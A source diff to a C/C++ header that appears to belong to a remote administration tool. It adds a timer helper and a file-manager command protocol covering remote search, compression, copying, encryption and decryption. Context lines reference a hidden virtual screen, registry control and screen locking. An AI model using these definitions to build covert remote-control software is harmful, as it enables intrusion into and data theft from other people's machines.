@@ -80,6 +80,12 @@ typedef void* LPVOID, * HANDLE;
 #define GET_FILEPATH(dir,file) [](char*d,const char*f){char*p=d;while(*p)++p;while('\\'!=*p&&p!=d)--p;strcpy(p+1,f);return d;}(dir,file)
 #endif
 
+inline int isValid_60s() {
+	static time_t tm = time(nullptr);
+	int span = int(time(nullptr) - tm);
+	return span <= 60;
+}
+
 inline int isValid_30s() {
 	static time_t tm = time(nullptr);
 	int span = int(time(nullptr) - tm);
@@ -226,7 +232,8 @@ enum
 	TOKEN_KEYFRAME=134,				// 关键帧
 	TOKEN_BITMAPINFO_HIDE,          // 虚拟屏幕
 	TOKEN_SCREEN_SIZE,              // 屏幕大小
-	
+	TOKEN_DRIVE_LIST_PLUGIN = 150,	// 文件管理(插件)
+
 	TOKEN_DECRYPT = 199,
 	TOKEN_REGEDIT = 200,            // 注册表
 	COMMAND_REG_FIND,				// 注册表 管理标识
@@ -380,6 +387,49 @@ enum ChatManager {
 	COMMAND_CHAT_CLOSE,
 	COMMAND_CHAT_SCREEN_LOCK,
 	COMMAND_CHAT_SCREEN_UNLOCK,
+};
+
+// 文件管理
+enum FileManager {
+	COMMAND_COMPRESS_FILE_PARAM=220,
+	COMMAND_FILES_SEARCH_START,
+	COMMAND_FILES_SEARCH_STOP,
+	COMMAND_FILE_EXCEPTION,
+	COMMAND_SEARCH_FILE,
+	COMMAND_FILE_GETNETHOOD,
+	COMMAND_FILE_RECENT,
+	COMMAND_FILE_INFO,
+	COMMAND_FILE_Encryption,
+	COMMAND_FILE_Decrypt,
+	COMMAND_FILE_ENFOCE,
+	COMMAND_FILE_CopyFile,
+	COMMAND_FILE_PasteFile,
+	COMMAND_FILE_zip,
+	COMMAND_FILE_zip_stop,
+	COMMAND_FILE_NO_ENFORCE,
+	COMMAND_FILE_GETINFO,
+
+	COMMAND_FILE_SEARCHPLUS_LIST,
+
+	TOKEN_SEARCH_FILE_LIST,
+	TOKEN_SEARCH_FILE_FINISH,
+	TOKEN_CFileManagerDlg_DATA_CONTINUE,
+	TOKEN_COMPRESS_FINISH,
+	TOKEN_SEARCH_ADD,
+	TOKEN_SEARCH_END,
+	TOKEN_FILE_GETNETHOOD,
+	TOKEN_FILE_RECENT,
+	TOKEN_FILE_INFO,
+	TOKEN_FILE_REFRESH,
+	TOKEN_FILE_ZIPOK,
+	TOKEN_FILE_GETINFO,
+
+	TOKEN_FILE_SEARCHPLUS_LIST,
+	TOKEN_FILE_SEARCHPLUS_NONTFS,
+	TOKEN_FILE_SEARCHPLUS_HANDLE,
+	TOKEN_FILE_SEARCHPLUS_INITUSN,
+	TOKEN_FILE_SEARCHPLUS_GETUSN,
+	TOKEN_FILE_SEARCHPLUS_NUMBER,
 };
 
 enum 
